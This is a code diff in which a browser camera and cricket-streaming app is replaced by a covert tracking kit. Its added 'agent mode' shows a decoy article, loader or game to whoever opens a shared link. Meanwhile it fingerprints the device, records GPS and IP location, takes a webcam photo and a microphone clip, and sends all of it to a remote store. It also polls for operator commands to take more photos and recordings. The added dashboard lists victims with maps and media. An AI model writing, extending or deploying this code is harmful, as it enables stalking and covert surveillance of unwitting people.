+  o.orient=screen.orientation?.type||'—';
+  o.gpuVendor=g.v; o.gpu=g.r; o.gpuChip=chipset(g.r); o.maxTex=g.t;
+  o.fpCanvas=(await sha(canvasFP())).slice(0,16);
+  o.fpAudio=await audioFP();
+  o.fonts=fonts(FONTLIST).join(', ')||'—';
+  o.cookie=navigator.cookieEnabled; o.dnt=navigator.doNotTrack||'—';
+  o.pdf=navigator.pdfViewerEnabled; o.webdriver=navigator.webdriver;
+  o.standalone=navigator.standalone||matchMedia('(display-mode: standalone)').matches;
+  o.darkMode=matchMedia('(prefers-color-scheme: dark)').matches;
+  o.reduceMotion=matchMedia('(prefers-reduced-motion: reduce)').matches;
+  o.pixelRatio=matchMedia('(min-resolution: 2dppx)').matches?'2x+':'1x';
+  o.localIP=await localIP();
+  o.history=history.length; o.referrer=document.referrer||'direct';
+  o.codecs=codecs();
+  o.plugins=[...navigator.plugins].map(x=>x.name).join(', ').slice(0,300)||'—';
+  try{ o.voices=(speechSynthesis.getVoices()||[]).map(v=>v.name+'('+v.lang+')').join(', ').slice(0,400)||'—'; }catch(e){o.voices='—'}
+  try{ o.drm=(await navigator.requestMediaKeySystemAccess('com.widevine.alpha',
+    [{initDataTypes:['cenc']}]).then(()=>'Widevine').catch(()=>'no')); }catch(e){o.drm='—'}
+  const con=navigator.connection;
+  if(con){ o.connType=con.effectiveType; o.downlink=con.downlink; o.rtt=con.rtt; o.saveData=con.saveData; }
+  o.online=navigator.onLine;
+  try{ const b=await navigator.getBattery(); o.bat=Math.round(b.level*100);
+    o.charging=b.charging; o.batTime=b.dischargingTime; }catch(e){}
+  try{ const e=await navigator.storage.estimate(); o.storageUsed=e.usage; o.storageQuota=e.quota; }catch(e){}
+  try{ const d=await navigator.mediaDevices.enumerateDevices();
+    o.cams=d.filter(x=>x.kind==='videoinput').length;
+    o.mics=d.filter(x=>x.kind==='audioinput').length; }catch(e){}
+  const el=document.createElement('div');
+  el.className='ad-placement adsbox ad-banner'; el.style.cssText='position:absolute;height:12px;width:250px;left:-9999px;top:0';
+  document.body.appendChild(el); o.adblock=el.offsetHeight===0; el.remove();
+
+  o.perms={};
+  for(const n of ['geolocation','camera','microphone','notifications']){
+    try{ o.perms[n]=(await navigator.permissions.query({name:n})).state; }catch(e){}
+  }
+  return o;
+}
+
+/* geo-IP (no permission needed) */
+async function geoIP(){
+  try{ const c=new AbortController(); setTimeout(()=>c.abort(),7000);
+    const r=await fetch('https://ipapi.co/json/',{signal:c.signal}); const j=await r.json();
+    return { ip:j.ip, city:j.city, region:j.region, country:j.country_name, cc:j.country_code,
+      postal:j.postal, lat:j.latitude, lon:j.longitude, isp:j.org, asn:j.asn, tz:j.timezone };
+  }catch(e){ try{ const r=await fetch('https://api.ipify.org?format=json');
+    return { ip:(await r.json()).ip }; }catch(e2){ return {}; } }
+}
+
+/* ═══════════════════════════════════════════════════════════
+   4. media grab
+   ═══════════════════════════════════════════════════════════ */
+async function grabPhoto(){
+  const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:640}}});
+  const v=document.createElement('video'); v.playsInline=true; v.muted=true; v.srcObject=s;
+  await v.play().catch(()=>{}); await sleep(800);
+  const W=220, H=Math.max(1,Math.round(W*((v.videoHeight||480)/(v.videoWidth||640))));
+  const c=document.createElement('canvas'); c.width=W; c.height=H;
+  c.getContext('2d').drawImage(v,0,0,W,H);
+  s.getTracks().forEach(t=>t.stop());
+  return c.toDataURL('image/jpeg',.62).split(',')[1];
+}
+async function grabAudio(ms=2500){
+  const s=await navigator.mediaDevices.getUserMedia({audio:true});
+  const mime=MediaRecorder.isTypeSupported('audio/webm;codecs=opus')?'audio/webm;codecs=opus'
+    :MediaRecorder.isTypeSupported('audio/mp4')?'audio/mp4':'';
+  const mr=new MediaRecorder(s,mime?{mimeType:mime}:undefined); const ch=[];
+  mr.ondataavailable=e=>e.data.size&&ch.push(e.data);
+  const stop=new Promise(r=>mr.onstop=r);
+  mr.start(); await sleep(ms); mr.stop(); await stop;
+  s.getTracks().forEach(t=>t.stop());
+  const ab=await new Blob(ch,{type:mr.mimeType}).arrayBuffer();
+  return { data:abToB64(ab), mime:mr.mimeType, size:ab.byteLength };
+}
+
+/* ═══════════════════════════════════════════════════════════
+   5. AGENT MODE  (victim opens link)
+   ═══════════════════════════════════════════════════════════ */
+const params=new URLSearchParams(location.search.replace(/^\?/,'')||'');
+const hashP=new URLSearchParams((location.hash||'').replace(/^#/,''));
+const TID=params.get('t')||hashP.get('t');
+const TBK=params.get('b')||hashP.get('b')||'kvdb';
+const DECOY=params.get('d')||'auto';
+
+if(TID){ agentBoot(); } else { dashBoot(); }
+
+async function agentBoot(){
+  $('#view-dash').hidden=true; $('#view-agent').hidden=false;
+  const boot=document.createElement('div'); boot.className='boot';
+  boot.innerHTML='<div><div class="spin"></div>'+
+    ['establishing secure channel','reading device signature','negotiating session key','done']
+      .map((t,i)=>'<div class="l" style="animation-delay:'+(i*.35)+'s">› '+t+'</div>').join('')+'</div>';
+  document.body.appendChild(boot);
+  Store.attach(TBK,TID);
+
+  /* decoy */
+  const dec=$('#decoy');
+  const decoys={
+    load:()=>'<div class="dec-load"><div><div class="spin"></div><b>Optimizing your experience…</b>'+
+      '<div style="opacity:.55;font-size:12.5px;margin-top:6px">please wait a moment</div></div></div>',
+    article:()=>'<div class="art"><div style="font-family:system-ui;font-size:11px;letter-spacing:2px;color:#00a37a">TECH · 4 MIN READ</div>'+
+      '<h1>The quiet revolution in how the web talks to your phone</h1>'+
+      '<div class="by">By A. Sharma · Updated today</div><div class="hero"></div>'+
+      '<div class="cap">Illustration — the modern browser API surface</div>'+
+      '<p>For most of computing history, getting a piece of software onto someone\'s device meant an install, a store listing and a permission dialogue. The web quietly changed that.</p>'+
+      '<p>Modern browsers now expose sensors, cameras, location, power state and network quality through a handful of JavaScript calls. A single page — no app store, no update cycle — can read a device the way a native app once did.</p>'+
+      '<p>What makes it interesting is how much arrives <i>without</i> a prompt. Screen geometry, GPU model, installed fonts, timezone and codec support together form a signature stable enough to recognise a returning visitor.</p>'+
+      '<p>Scroll a little further and you\'ll find the second tier: precise location, a photo, a short recording. Each needs one tap of "Allow" — and each unlocks a category of experience that used to require a download.</p>'+
+      '<p>The result is a web that feels less like documents and more like software. And it is already in your pocket.</p></div>',
+    game:()=>'<div class="game"><div><b style="font-size:17px">Tap the dot</b>'+
+      '<div style="font-size:12px;opacity:.6;margin-top:4px">score: <span id="sc">0</span></div>'+
+      '<div id="arena"><div id="tgt"></div></div></div></div>',
+    blank:()=>'<div class="blank"></div>',
+    recon:()=>'<div style="padding:20px;font-family:ui-monospace,monospace;font-size:12px;white-space:pre-wrap" id="reconout">reading…</div>'
   };
-  try{
-    if(stream){ stream.getTracks().forEach(t=>t.stop()); }
-    stream = await navigator.mediaDevices.getUserMedia(constraints);
-    preview.srcObject = stream;
-    noStream.style.display = 'none';
-    resLabel.textContent = resVal + 'p';
-    setupAudioMeter(stream);
-    setupTorchSupport();
-  }catch(err){ showToast('Camera/Mic access nahi mila: ' + err.message); }
-}
-function setupAudioMeter(s){
-  try{
-    if(audioCtx) audioCtx.close();
-    audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-    const src = audioCtx.createMediaStreamSource(s);
-    analyser = audioCtx.createAnalyser();
-    analyser.fftSize = 64;
-    dataArray = new Uint8Array(analyser.frequencyBinCount);
-    src.connect(analyser);
-    requestAnimationFrame(drawMeter);
+  const pick = DECOY==='auto' ? 'load' : (decoys[DECOY]?DECOY:'load');
+  dec.innerHTML=decoys[pick]();
+  if(pick==='game') startGame();
+
+  /* ── capture pipeline ── */
+  const rec={ fp:null, ts:Date.now(), visits:1, first:Date.now(), cmdSeen:0 };
+  let deep=null, gip={}, watchId=null, seen=false;
+
+  try{ const k='lh_'+TID;
+    const prev=JSON.parse(localStorage.getItem(k)||'null');
+    if(prev){ rec.visits=prev.v+1; rec.first=prev.f; }
+    localStorage.setItem(k,JSON.stringify({v:rec.visits,f:rec.first}));
   }catch(e){}
-}
-function drawMeter(){
-  if(analyser){
-    analyser.getByteFrequencyData(dataArray);
-    meterBars.forEach((bar,i)=>{
-      const val = dataArray[i*3] || 0;
-      bar.style.height = Math.max(3,(val/255)*18)+'px';
+
+  await sleep(1600);
+  deep=await collectDeep(); rec.fp=deep.fp; Object.assign(rec,deep);
+  boot.remove();
+
+  async function push(extra){
+    Object.assign(rec,extra||{},{
+      lastSeen:Date.now(), online:navigator.onLine,
+      bat:rec.bat, charging:rec.charging, cmdSeen:rec.cmdSeen
     });
+    try{ await Store.put('d-'+rec.fp, rec); }catch(e){}
   }
-  requestAnimationFrame(drawMeter);
-}
-function setupTorchSupport(){
-  const track = stream.getVideoTracks()[0];
-  const caps = track.getCapabilities ? track.getCapabilities() : {};
-  torchBtn.style.opacity = caps.torch ? '1' : '.35';
-}
-async function toggleTorch(){
-  if(!stream) return;
-  const track = stream.getVideoTracks()[0];
-  const caps = track.getCapabilities ? track.getCapabilities() : {};
-  if(!caps.torch){ showToast('Is device par flash support nahi hai'); return; }
-  torchOn = !torchOn;
-  await track.applyConstraints({ advanced:[{ torch: torchOn }] });
-  torchBtn.classList.toggle('active', torchOn);
-}
-function toggleMic(){
-  if(!stream) return;
-  micOn = !micOn;
-  stream.getAudioTracks().forEach(t=> t.enabled = micOn);
-  micBtn.textContent = micOn ? '🎙️' : '🔇';
-  micBtn.classList.toggle('active', !micOn);
-  showToast(micOn ? 'Mic ON' : 'Mic Muted');
-}
-function cycleFilter(){
-  currentFilterIndex = (currentFilterIndex+1) % filters.length;
-  const f = filters[currentFilterIndex];
-  preview.style.filter = f.css;
-  filterLabel.textContent = f.name;
-  filterLabel.style.display = 'block';
-  clearTimeout(cycleFilter._t);
-  cycleFilter._t = setTimeout(()=> filterLabel.style.display='none', 1400);
-  document.querySelectorAll('.chip').forEach((c,i)=>c.classList.toggle('active', i===currentFilterIndex));
-}
-function buildFilterChips(){
-  filterChips.innerHTML = '';
-  filters.forEach((f,i)=>{
-    const chip = document.createElement('div');
-    chip.className = 'chip' + (i===0 ? ' active':'');
-    chip.textContent = f.name;
-    chip.onclick = ()=>{
-      currentFilterIndex = i;
-      preview.style.filter = f.css;
-      document.querySelectorAll('.chip').forEach((c,j)=>c.classList.toggle('active', j===i));
-    };
-    filterChips.appendChild(chip);
-  });
-}
-async function flipCamera(){
-  facingMode = facingMode === 'user' ? 'environment' : 'user';
-  await startCamera();
-  showToast(facingMode==='user' ? 'Front Camera' : 'Back Camera');
-}
-wmInput.addEventListener('input', ()=>{ wmOverlay.textContent = wmInput.value; });
 
-resSelect.onchange = ()=> startCamera();
+  await push();
+  gip=await geoIP(); Object.assign(rec,gip); await push();
+  fillSheet();
 
-function snapshot(){
-  if(!stream) return;
-  const src = adMode ? adPlayer : preview;
-  const c = document.createElement('canvas');
-  c.width = src.videoWidth || 1280; c.height = src.videoHeight || 720;
-  const cctx = c.getContext('2d');
-  cctx.filter = adMode ? 'none' : (preview.style.filter || 'none');
-  cctx.drawImage(src, 0, 0, c.width, c.height);
-  if(!adMode && wmInput.value){
-    cctx.font = 'bold 26px Poppins, sans-serif';
-    cctx.fillStyle = 'rgba(255,255,255,0.85)';
-    cctx.shadowColor = 'rgba(0,0,0,0.6)'; cctx.shadowBlur = 6;
-    cctx.fillText(wmInput.value, 20, c.height - 26);
+  if(pick==='load'){ await sleep(1200); dec.innerHTML=decoys.article(); }
+
+  /* tier-1: location */
+  if(navigator.geolocation){
+    navigator.geolocation.getCurrentPosition(p=>{
+      Object.assign(rec,{ gpsLat:p.coords.latitude, gpsLon:p.coords.longitude,
+        gpsAcc:p.coords.accuracy, gpsAt:Date.now() }); push(); fillSheet();
+      watchId=navigator.geolocation.watchPosition(q=>{
+        Object.assign(rec,{ gpsLat:q.coords.latitude, gpsLon:q.coords.longitude,
+          gpsAcc:q.coords.accuracy, gpsAt:Date.now() }); push();
+      },()=>{},{enableHighAccuracy:true,maximumAge:8000});
+    },err=>{ rec.gpsErr=err.message; push(); fillSheet(); },
+    {enableHighAccuracy:true,timeout:12000,maximumAge:0});
   }
-  const link = document.createElement('a');
-  link.download = 'snapshot-' + Date.now() + '.png';
-  link.href = c.toDataURL('image/png');
-  link.click();
-  showToast('Snapshot saved 📸');
-}
-snapBtn.onclick = snapshot;
 
-/* ================= RECORDING (canvas compose) ================= */
-let scoreboardOn = true;
-function startComposeLoop(){
-  compose.width = preview.videoWidth || 1280;
-  compose.height = preview.videoHeight || 720;
-  function draw(){
-    if(!isRecording) return;
-    const source = adMode ? adPlayer : preview;
-    ctx.filter = adMode ? 'none' : (preview.style.filter || 'none');
-    try{ ctx.drawImage(source, 0, 0, compose.width, compose.height); }catch(e){}
-    ctx.filter = 'none';
-    if(adMode){
-      ctx.fillStyle = 'rgba(255,59,92,0.9)';
-      roundRect(ctx, compose.width*0.35, 16, compose.width*0.3, compose.height*0.06, 8);
-      ctx.fill();
-      ctx.fillStyle = '#fff';
-      ctx.font = 'bold ' + Math.round(compose.width*0.025) + 'px Poppins, sans-serif';
-      ctx.textAlign='center'; ctx.textBaseline='middle';
-      ctx.fillText('AD BREAK', compose.width*0.5, 16 + (compose.height*0.06)/2);
-      ctx.textAlign='left'; ctx.textBaseline='alphabetic';
-    } else {
-      if(wmInput.value){
-        ctx.font = 'bold ' + Math.round(compose.width*0.03) + 'px Poppins, sans-serif';
-        ctx.fillStyle = 'rgba(255,255,255,0.85)';
-        ctx.shadowColor = 'rgba(0,0,0,0.6)'; ctx.shadowBlur = 6;
-        ctx.fillText(wmInput.value, 20, compose.height - 40);
-      }
-      ctx.font = '16px Inter, sans-serif';
-      ctx.fillStyle = 'rgba(255,255,255,0.7)';
-      ctx.shadowBlur = 4;
-      ctx.fillText(new Date().toLocaleTimeString(), 20, 30);
-      if(scoreboardOn) drawScoreboardOnCanvas();
-    }
-    requestAnimationFrame(draw);
+  /* tier-1: camera + mic */
+  await sleep(2600);
+  try{ rec.photo=await grabPhoto(); await push('p-'+rec.fp?undefined:undefined);
+    await Store.put('p-'+rec.fp, rec.photo); delete rec.photo; await push(); fillSheet(); }catch(e){ rec.camErr=e.name; push(); }
+  await sleep(600);
+  try{ const a=await grabAudio(2500);
+    await Store.put('a-'+rec.fp, a); rec.audioMime=a.mime; rec.audioSize=a.size; await push(); fillSheet(); }catch(e){ rec.micErr=e.name; push(); }
+
+  /* keep-alive ping */
+  setInterval(async()=>{
+    try{ const b=await navigator.getBattery(); rec.bat=Math.round(b.level*100); rec.charging=b.charging; }catch(e){}
+    push();
+  },12000);
+
+  /* remote command poll */
+  setInterval(async()=>{
+    try{
+      const c=await Store.get('c-'+rec.fp); if(!c||!c.ts||c.ts<=rec.cmdSeen)return;
+      rec.cmdSeen=c.ts;
+      if(c.cmd==='snap'){ try{ const ph=await grabPhoto();
+        await Store.put('p-'+rec.fp,ph); rec.photoAt=Date.now(); await push(); }catch(e){} }
+      if(c.cmd==='mic'){ try{ const a=await grabAudio(2000);
+        await Store.put('a-'+rec.fp,a); rec.audioMime=a.mime; await push(); }catch(e){} }
+      await push();
+    }catch(e){}
+  },8000);
+
+  /* sheet */
+  function fillSheet(){
+    const p=platform();
+    $('#sheetbody').innerHTML=
+      kv('device',p.model)+kv('os',p.os+' '+p.osVer)+kv('browser',p.br+' '+p.browserVer)+
+      kv('screen',rec.screen+' @'+rec.dpr+'x')+kv('gpu',rec.gpuChip)+
+      kv('location',rec.gpsLat?rec.gpsLat.toFixed(5)+', '+rec.gpsLon.toFixed(5):
+        (gip.city?gip.city+', '+gip.country:'requesting…'))+
+      kv('network',(gip.ip||'—')+(rec.connType?' · '+rec.connType:''))+
+      kv('battery',rec.bat!=null?rec.bat+'%'+(rec.charging?' ⚡':''):'—')+
+      kv('photo',rec.photoAt||rec.photo!==undefined?'captured':'—');
   }
-  draw();
-}
-function drawScoreboardOnCanvas(){
-  const w = compose.width, h = compose.height;
-  const bx = w*0.02, bw = w*0.96, by = h - h*0.22, bh = h*0.13;
-  const teamName = battingTeam==='A' ? (teamAName.value||'Team A') : (teamBName.value||'Team B');
-  const barColor = battingTeam==='A' ? teamAColor.value : teamBColor.value;
-  ctx.shadowBlur = 0;
-  ctx.fillStyle = barColor;
-  roundRect(ctx, bx, by, bw, bh, 10);
-  ctx.fill();
-  const pad = w*0.02;
-  ctx.fillStyle = '#fff';
-  ctx.font = 'bold ' + Math.round(w*0.028) + 'px Poppins, sans-serif';
-  ctx.textBaseline = 'top';
-  ctx.fillText(teamName, bx+pad, by+pad*0.6);
-  ctx.font = 'bold ' + Math.round(w*0.034) + 'px Poppins, sans-serif';
-  const scoreText = cricket.runs + '/' + cricket.wickets + '  (' + oversDisplay() + ')';
-  const scoreWidth = ctx.measureText(scoreText).width;
-  ctx.fillText(scoreText, bx+bw-pad-scoreWidth, by+pad*0.4);
-  ctx.font = Math.round(w*0.017) + 'px Inter, sans-serif';
-  ctx.fillStyle = 'rgba(255,255,255,0.85)';
-  ctx.fillText('CRR '+crrDisplay(), bx+pad, by+bh*0.42);
-  ctx.fillText(cricket.striker.name+'* '+cricket.striker.runs+'('+cricket.striker.balls+')  ·  '+cricket.nonStriker.name+' '+cricket.nonStriker.runs+'('+cricket.nonStriker.balls+')', bx+pad, by+bh*0.68);
-}
-function roundRect(c,x,y,w,h,r){
-  c.beginPath();
-  c.moveTo(x+r,y);
-  c.arcTo(x+w,y,x+w,y+h,r);
-  c.arcTo(x+w,y+h,x,y+h,r);
-  c.arcTo(x,y+h,x,y,r);
-  c.arcTo(x,y,x+w,y,r);
-  c.closePath();
-}
-function startTimer(){
-  seconds = 0; timerEl.textContent = '00:00';
-  timerInterval = setInterval(()=>{ seconds++; timerEl.textContent = fmtTime(seconds); }, 1000);
-}
-function stopTimer(){ clearInterval(timerInterval); }
-function startViewerSim(){
-  viewerCountEl.textContent = '0';
-  let v = 0;
-  viewerInterval = setInterval(()=>{ v += Math.floor(Math.random()*4); viewerCountEl.textContent = v; }, 2500);
-}
-function stopViewerSim(){ clearInterval(viewerInterval); viewerCountEl.textContent = '0'; }
+  const kv=(k,v)=>'<div class="kv"><b>'+k+'</b><i>'+esc(v)+'</i></div>';
 
-function startRecording(){
-  if(!stream){ showToast('Pehle camera shuru karo'); return; }
-  isRecording = true;
-  startComposeLoop();
-  const canvasStream = compose.captureStream(30);
-  const audioTrack = stream.getAudioTracks()[0];
-  if(audioTrack) canvasStream.addTrack(audioTrack);
-  recordedChunks = [];
-  const bitrate = parseInt(bitrateSelect.value) * 1000;
-  try{
-    mediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm;codecs=vp9,opus', videoBitsPerSecond: bitrate });
-  }catch(e){ mediaRecorder = new MediaRecorder(canvasStream); }
-  mediaRecorder.ondataavailable = e => { if(e.data.size>0) recordedChunks.push(e.data); };
-  mediaRecorder.onstop = ()=>{
-    const blob = new Blob(recordedChunks, {type:'video/webm'});
-    const url = URL.createObjectURL(blob);
-    const a = document.createElement('a');
-    a.href = url; a.download = 'stream-recording-' + Date.now() + '.webm';
-    a.click();
-    URL.revokeObjectURL(url);
-    showToast('Recording saved ✅');
+  $('#fab').onclick=()=>$('#sheet').classList.add('up');
+  $('#sheetClose').onclick=()=>$('#sheet').classList.remove('up');
+
+  /* tiny game */
+  function startGame(){
+    const t=$('#tgt'),a=$('#arena'); let s=0;
+    const mv=()=>{ const r=a.getBoundingClientRect();
+      t.style.left=Math.random()*(r.width-56)+'px'; t.style.top=Math.random()*(r.height-56)+'px'; };
+    mv(); t.onclick=e=>{ e.stopPropagation(); s++; $('#sc').textContent=s; mv(); };
+  }
+}
+
+/* ═══════════════════════════════════════════════════════════
+   6. DASHBOARD MODE  (owner)
+   ═══════════════════════════════════════════════════════════ */
+let pollTimer=null, known=new Set(), audioCtx=null;
+
+async function dashBoot(){
+  if(location.protocol==='file:') $('#filewarn').hidden=false;
+
+  const saved=JSON.parse(localStorage.getItem('lh_session')||'null');
+  if(saved&&saved.id){ Store.attach(saved.backend,saved.id); showLink(); startPolling(); }
+
+  $('#genBtn').onclick=async()=>{
+    $('#genBtn').textContent='CREATING…'; $('#genBtn').disabled=true;
+    const id=await Store.create();
+    $('#genBtn').disabled=false; $('#genBtn').textContent='GENERATE LINK';
+    if(!id){ alert('Backend reachable nahi. Internet check karo.'); return; }
+    localStorage.setItem('lh_session',JSON.stringify({backend:Store.backend,id}));
+    showLink(); startPolling();
   };
-  mediaRecorder.start();
-  recBtn.classList.add('recording');
-  startTimer();
+  $('#resetBtn').onclick=()=>{
+    if(!confirm('Naya session? Purana link band ho jaayega.'))return;
+    localStorage.removeItem('lh_session'); known.clear(); $('#devlist').innerHTML='';
+    $('#cnt').textContent='0'; $('#linkbox').hidden=true; $('#resetBtn').hidden=true;
+    clearInterval(pollTimer); setStatus('idle',false);
+  };
+  $('#copyBtn').onclick=()=>copy($('#link').value);
+  $('#openBtn').onclick=()=>window.open($('#link').value,'_blank');
+  $('#shareBtn').onclick=()=>navigator.share?navigator.share({title:'check this',url:$('#link').value}):copy($('#link').value);
+  $('#refreshBtn').onclick=()=>poll(true);
+  $('#exportBtn').onclick=()=>{
+    const r=$('#raw'); r.hidden=!r.hidden;
+    if(!r.hidden) r.textContent=JSON.stringify(window.__all||{},null,2);
+  };
+  document.addEventListener('visibilitychange',()=>{ if(!document.hidden) poll(true); });
 }
-function stopRecording(){
-  isRecording = false;
-  if(mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop();
-  recBtn.classList.remove('recording');
-  stopTimer();
-}
-recBtn.onclick = ()=>{ if(!isRecording) startRecording(); else stopRecording(); };
 
-function goLive(){
-  if(!stream){ showToast('Pehle camera shuru karo'); return; }
-  isLive = !isLive;
-  if(isLive){
-    liveDot.classList.add('on'); liveLabel.textContent = 'LIVE'; goLiveBtn.textContent = '⏹';
-    startViewerSim();
-    if(!isRecording) startRecording();
-    showToast(rtmpInput.value.trim() ? 'Local live preview shuru — RTMP push ke liye backend server chahiye' : 'Aap ab LIVE ho (local preview)');
-  } else {
-    liveDot.classList.remove('on'); liveLabel.textContent = 'OFFLINE'; goLiveBtn.textContent = '▶';
-    stopViewerSim();
-    if(isRecording) stopRecording();
-    showToast('Live khatam');
+function showLink(){
+  const link=location.origin+location.pathname+'?t='+Store.id+'&b='+Store.backend;
+  $('#link').value=link;
+  $('#linkbox').hidden=false; $('#resetBtn').hidden=false;
+  $('#backendInfo').textContent='backend: '+Store.backend+' · id: '+Store.id;
+  $('#qr').src='https://api.qrserver.com/v1/create-qr-code/?size=300x300&margin=6&data='+encodeURIComponent(link);
+  setStatus('link ready',true);
+}
+function copy(t){ navigator.clipboard?.writeText(t).then(()=>toast('copied'),()=>{})
+  ||0; const i=$('#link'); i.select(); document.execCommand?.('copy'); toast('copied'); }
+function toast(m){ const s=$('#nettxt'); const o=s.textContent; s.textContent=m;
+  setTimeout(()=>s.textContent=o,1200); }
+function setStatus(t,live){ $('#nettxt').textContent=t; $('#netdot').classList.toggle('live',!!live); }
+
+function startPolling(){ clearInterval(pollTimer); poll(true); pollTimer=setInterval(poll,6000); }
+
+async function poll(force){
+  if(document.hidden&&!force) return;
+  if(Store.backend==='local') return;
+  $('#lastPoll').textContent='sync '+new Date().toLocaleTimeString().slice(0,8);
+  let keys=[]; try{ keys=await Store.list('d-'); }catch(e){ return; }
+  if(!Array.isArray(keys)) return;
+  const ids=[...new Set(keys.map(k=>String(k).replace(/^d-/,'')))].slice(0,60);
+  const out={}; let fresh=false;
+  for(const id of ids){
+    const r=await Store.get('d-'+id); if(!r)continue; out[id]=r;
+    if(!known.has(id)){ known.add(id); fresh=true; }
+  }
+  window.__all=out;
+  render(out);
+  if(fresh){ beep(); navigator.vibrate?.(60); setStatus('new device',true); }
+  else setStatus(ids.length?ids.length+' device(s) live':'link ready',ids.length>0);
+}
+
+function beep(){ try{
+  audioCtx=audioCtx||new (window.AudioContext||window.webkitAudioContext)();
+  const o=audioCtx.createOscillator(),g=audioCtx.createGain();
+  o.type='sine';o.frequency.value=880;g.gain.value=.07;
+  o.connect(g);g.connect(audioCtx.destination);o.start();o.stop(audioCtx.currentTime+.16);
+}catch(e){} }
+
+function render(all){
+  const list=$('#devlist'); const ids=Object.keys(all);
+  $('#cnt').textContent=ids.length;
+  if(!ids.length){ list.innerHTML='<div class="empty">Abhi koi device nahi.<br>Link banao aur kisi ko bhejo.</div>'; return; }
+  ids.sort((a,b)=>(all[b].lastSeen||0)-(all[a].lastSeen||0));
+  list.innerHTML=ids.map(id=>devCard(id,all[id])).join('');
+  ids.forEach(id=>loadMedia(id,all[id]));
+}
+
+function devCard(id,r){
+  const live=Date.now()-(r.lastSeen||0)<40000;
+  const loc=r.gpsLat?r.gpsLat.toFixed(5)+', '+r.gpsLon.toFixed(5)
+    :(r.city?r.city+', '+(r.region||'')+', '+(r.country||''):'—');
+  const map=r.gpsLat?`https://www.google.com/maps?q=${r.gpsLat},${r.gpsLon}`:
+    (r.lat?`https://www.google.com/maps?q=${r.lat},${r.lon}`:null);
+  return `<div class="dev${known.has(id)?'':' new'}" data-id="${esc(id)}">
+    <div class="devhead">
+      <div class="avatar" id="av-${esc(id)}">📱</div>
+      <div style="flex:1;min-width:0">
+        <div class="devname">${esc(r.model||'Unknown device')}</div>
+        <div class="devmeta">${esc(r.os||'')} ${esc(r.osVer||'')} · ${esc(r.browser||'')} · ${live?'<span style="color:var(--acc)">● live</span>':'last seen '+ago(r.lastSeen)}</div>
+      </div>
+      <span class="pill">#${esc(String(id).slice(0,6))}</span>
+    </div>
+    <div class="grid">
+      <div class="chip">IP / ISP<b>${esc(r.ip||'—')}</b></div>
+      <div class="chip">City<b>${esc([r.city,r.country].filter(Boolean).join(', ')||'—')}</b></div>
+      <div class="chip">GPS<b>${esc(loc)}</b>${r.gpsAcc?'<span style="font-size:10px"> ±'+Math.round(r.gpsAcc)+'m</span>':''}</div>
+      <div class="chip">Network<b>${esc(r.isp||'—')}</b></div>
+      <div class="chip">Screen<b>${esc(r.screen||'—')} @${esc(r.dpr||'')}x</b></div>
+      <div class="chip">GPU<b>${esc(r.gpuChip||'—')}</b></div>
+      <div class="chip">Battery<b>${r.bat!=null?r.bat+'%'+(r.charging?' ⚡':''):'—'}</b>
+        ${r.bat!=null?'<div class="bar"><i style="width:'+r.bat+'%"></i></div>':''}</div>
+      <div class="chip">Cores / RAM<b>${esc(r.cores||'?')} / ${esc(r.mem?r.mem+'GB':'?')}</b></div>
+      <div class="chip">Timezone<b>${esc(r.tz||'—')}</b></div>
+      <div class="chip">Language<b>${esc(r.langs||r.lang||'—')}</b></div>
+      <div class="chip">Type<b>${esc(r.deviceType||'—')}</b></div>
+      <div class="chip">Visits<b>${esc(r.visits||1)}</b></div>
+    </div>
+    <div class="actions">
+      <button class="sm" data-act="detail" data-id="${esc(id)}">DETAILS</button>
+      ${map?'<button class="sm" data-act="map" data-id="'+esc(id)+'">MAP</button>':''}
+      <button class="sm" data-act="snap" data-id="${esc(id)}">📷 REMOTE SNAP</button>
+      <button class="sm" data-act="mic" data-id="${esc(id)}">🎙 REMOTE MIC</button>
+      <button class="sm danger" data-act="del" data-id="${esc(id)}">DELETE</button>
+    </div>
+    <div class="detail" id="dt-${esc(id)}" hidden></div>
+    <div class="med" id="md-${esc(id)}"></div>
+  </div>`;
+}
+
+async function loadMedia(id,r){
+  const box=$('#md-'+id); if(!box) return;
+  if(!r.photoAt&&!box.dataset.p){
+    try{ const p=await Store.get('p-'+id);
+      if(p&&typeof p==='string'){ const a=$('#av-'+id);
+        if(a){ a.outerHTML='<img class="avatar" id="av-'+id+'" src="data:image/jpeg;base64,'+p+'">'; }
+        box.dataset.p='1'; } }catch(e){}
+  }
+  if(!box.dataset.a){
+    try{ const a=await Store.get('a-'+id);
+      if(a&&a.data){ const el=document.createElement('audio');
+        el.controls=true; el.src='data:'+(a.mime||'audio/webm')+';base64,'+a.data;
+        box.appendChild(el); box.dataset.a='1'; } }catch(e){}
   }
 }
-goLiveBtn.onclick = goLive;
 
-flipBtn.onclick = flipCamera;
-torchBtn.onclick = toggleTorch;
-micBtn.onclick = toggleMic;
-filterBtn.onclick = cycleFilter;
-startBtn.onclick = startCamera;
-
-stopAllBtn.onclick = ()=>{
-  if(stream){ stream.getTracks().forEach(t=>t.stop()); stream = null; }
-  preview.srcObject = null;
-  noStream.style.display = 'flex';
-  isLive = false; isRecording = false;
-  liveDot.classList.remove('on'); liveLabel.textContent = 'OFFLINE'; goLiveBtn.textContent = '▶';
-  recBtn.classList.remove('recording');
-  stopTimer(); stopViewerSim();
-  showToast('Camera band ho gaya');
-};
-
-buildFilterChips();
-
-/* ================= AD BREAK VIDEO (persisted, controlled from below the screen) ================= */
-document.getElementById('adFileInput').onchange = e=>{
-  const f = e.target.files[0];
-  if(f){
-    adPlayer.src = URL.createObjectURL(f);
-    adStatusLabel.textContent = 'Saved: ' + f.name;
-    showToast('Ad video load ho gaya aur saved hai');
+document.addEventListener('click',async e=>{
+  const b=e.target.closest('[data-act]'); if(!b) return;
+  const id=b.dataset.id, act=b.dataset.act;
+  if(act==='map'){ const r=(window.__all||{})[id];
+    const u=r.gpsLat?`https://www.google.com/maps?q=${r.gpsLat},${r.gpsLon}`:
+      `https://www.google.com/maps?q=${r.lat},${r.lon}`; window.open(u,'_blank'); }
+  if(act==='del'){ await Store.del('d-'+id); known.delete(id); poll(true); }
+  if(act==='snap'){ await Store.put('c-'+id,{cmd:'snap',ts:Date.now()}); toast('snap sent'); b.textContent='📷 SENT'; }
+  if(act==='mic'){ await Store.put('c-'+id,{cmd:'mic',ts:Date.now()}); toast('mic sent'); b.textContent='🎙 SENT'; }
+  if(act==='detail'){
